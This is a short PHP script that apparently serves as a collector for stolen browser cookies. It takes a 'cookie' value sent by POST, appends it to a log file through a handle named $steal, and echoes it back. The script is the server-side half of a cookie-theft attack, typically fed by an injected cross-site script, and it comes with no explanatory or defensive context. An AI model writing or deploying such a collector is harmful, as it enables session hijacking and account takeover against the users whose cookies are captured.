<?php

$cookie = $_POST["cookie"];
$time = time();
$steal = fopen("log.txt", "a");
fwrite($steal, $cookie ."\\n");
fclose($steal);
echo $cookie;